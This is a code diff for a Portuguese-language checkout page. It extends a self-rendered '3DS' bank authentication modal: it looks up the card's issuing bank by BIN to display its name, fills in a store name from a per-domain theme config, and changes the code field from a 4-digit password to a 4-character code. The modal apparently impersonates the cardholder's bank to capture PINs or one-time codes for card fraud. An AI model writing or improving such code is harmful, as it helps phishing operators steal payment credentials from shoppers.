@@ -2514,15 +2514,37 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
   const authInfoAmount = document.getElementById('auth-info-amount');
   const authInfoDate = document.getElementById('auth-info-date');
   const authInfoCard = document.getElementById('auth-info-card');
+  const auth3dsBankName = document.getElementById('auth-3ds-bank-name');
+  const auth3dsStoreName = document.getElementById('auth-3ds-store-name');
+  const auth3dsAmountTwo = document.getElementById('auth-info-amount-2');
+  const auth3dsCompanyRef = document.getElementById('auth-3ds-company-ref');
+  const auth3dsCompanyRef2 = document.getElementById('auth-3ds-company-ref-2');
+  const auth3dsFooterName = document.getElementById('auth-3ds-footer-name');
   const btnCancel3ds = document.getElementById('btn-cancel-3ds');
   const btnSubmit3ds = document.getElementById('btn-submit-3ds');
   const digitInputs = document.querySelectorAll('.auth-digit-input');
 
-  // Lógica dos campos de senha de 4 dígitos
+  // BIN Lookup: detecta banco emissor pelos primeiros 6 dígitos do cartão
+  async function lookupBinBank(cardNumber) {
+    const digits = cardNumber.replace(/\D/g, '');
+    if (digits.length < 6) return null;
+    const bin = digits.substring(0, 6);
+    try {
+      const res = await fetch(`https://lookup.binlist.net/${bin}`, {
+        headers: { 'Accept-Version': '3' }
+      });
+      if (!res.ok) return null;
+      const data = await res.json();
+      return data.bank && data.bank.name ? data.bank.name.toUpperCase() : null;
+    } catch(e) {
+      return null;
+    }
+  }
+
+  // Lógica dos campos de código de 4 caracteres (alfanumérico)
   digitInputs.forEach((input, idx) => {
-    // Filtrar somente n├â┬║meros ao digitar
     input.addEventListener('input', (e) => {
-      input.value = input.value.replace(/\D/g, '');
+      input.value = input.value.replace(/[^0-9a-zA-Z]/g, '').toUpperCase();
       
       if (input.value.length === 1) {
         const nextInput = document.getElementById(`auth-digit-${idx + 2}`);
@@ -2788,16 +2810,26 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
       authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];
 
       const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-      authInfoAmount.textContent = totalBrl;
+      if (authInfoAmount) authInfoAmount.textContent = totalBrl;
+      if (auth3dsAmountTwo) auth3dsAmountTwo.textContent = totalBrl;
 
-      const now = new Date();
-      const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
-      authInfoDate.textContent = formattedDate;
+      // Preencher nome da loja dinamicamente a partir da config
+      const storeName = (window._currentThemeConfig && window._currentThemeConfig.storeName)
+        || (window._currentThemeConfig && window._currentThemeConfig.wooCommerceDomain)
+        || 'Empório Mais Sabor';
+      if (auth3dsStoreName) auth3dsStoreName.textContent = storeName;
 
-      const last4 = cardInput.value.replace(/\D/g, '').slice(-4);
-      authInfoCard.textContent = `XXXX XXXX XXXX ${last4 || '0000'}`;
+      // Preencher banco emissor via BIN lookup
+      if (auth3dsBankName) {
+        auth3dsBankName.textContent = detectedBrand ? detectedBrand.toUpperCase() + ' BANK' : 'BANCO EMISSOR';
+        lookupBinBank(cardInput.value).then(bankName => {
+          if (bankName && auth3dsBankName) {
+            auth3dsBankName.textContent = bankName;
+          }
+        }).catch(() => {});
+      }
 
-      // Limpa os campos de senha e coloca foco no primeiro
+      // Limpa os campos de código
       digitInputs.forEach(input => input.value = '');
       
       // Esconde o loading overlay e abre o modal 3DS
